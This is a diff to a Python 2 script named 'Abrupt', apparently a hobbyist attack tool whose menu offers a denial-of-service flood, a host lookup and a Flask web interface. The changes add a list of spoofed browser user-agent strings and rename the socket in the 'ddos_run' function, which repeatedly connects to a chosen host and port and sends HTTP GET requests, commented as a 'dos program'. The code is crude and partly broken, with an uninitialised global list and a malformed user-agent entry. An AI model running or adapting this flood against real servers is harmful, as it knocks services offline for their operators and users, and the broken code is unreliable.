@@ -7,13 +7,6 @@
 #+------------------------------------------------+
 """
 """
-
-__name = 'Abrupt'
-__author = '@strrrry'
-__email = 'zeekthegeek291@gamil.com'
-__website = 'http://abrupt.github.io/'
-
-
 import time,os,sys,string,random,subprocess,re,socket,httplib
 from flask import Flask
 from termcolor import colored, cprint
@@ -25,7 +18,16 @@ version = "0.0.2]"
 subprocess.call('clear', shell=True)
 
 def user_agents():
-	useragents = []
+	global useragents
+	useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
+	useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+	useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+	useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
+	useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
+	useragents.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+	useragents.append("uagent=[]Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
+	useragents.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+	useragents.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
 	return(useragents)
 
 def main():
@@ -80,29 +82,32 @@ def main():
 				exit()
 
         	def ddos_run():
-        		ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        		#Sufficent dos program / needs improvment 
+        		attack = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         		try:
         			#start ddos attack
-        			ddos.connect((host, open_port))
-        			ddos.send( "GET /%s HTTP/1.1\r\n" % message )
-			        ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, open_port) )
-			        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
+        			attack.connect((host, open_port))
+        			attack.send( "GET /%s HTTP/1.1\r\n" % message)
+			        attack.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, open_port))
+			        attack.send( "GET /%s HTTP/1.1\r\n" % message)
         		except socket.error, msg:
         			print("\n\t[!] [Connection Failed]")
         			exit()
         		cprint("[" + time.ctime(time.time()) + "]" + " [Attack Serving on port: %s]" % open_port, 'cyan', attrs=['bold'])
         		cprint ("[%s]" % ip, 'yellow', attrs=['bold'])
-        		ddos.close()
+        		attack.close()
 
         	for i in xrange(int(conn)):
         		ddos_run()
 
         if choice == '2':
+        	#Person I kinda stole from: https://github.com/kiripaul/DNS_lookup_AND_port_Scanner/blob/master/nslookup_prog.py just changed it 
 
-        	port_scanner()
+        	server = raw_input("Enter Host: ")
 						
         if choice == '3':
         	#Run webgui
+        	#Web tut: http://flask.pocoo.org/
 			app = Flask(__name__)
 
 			@app.route("/")
@@ -153,6 +158,6 @@ def main():
 
 
 if __name__ == '__main__':
-		main()
+	main()
 		
 	                                             
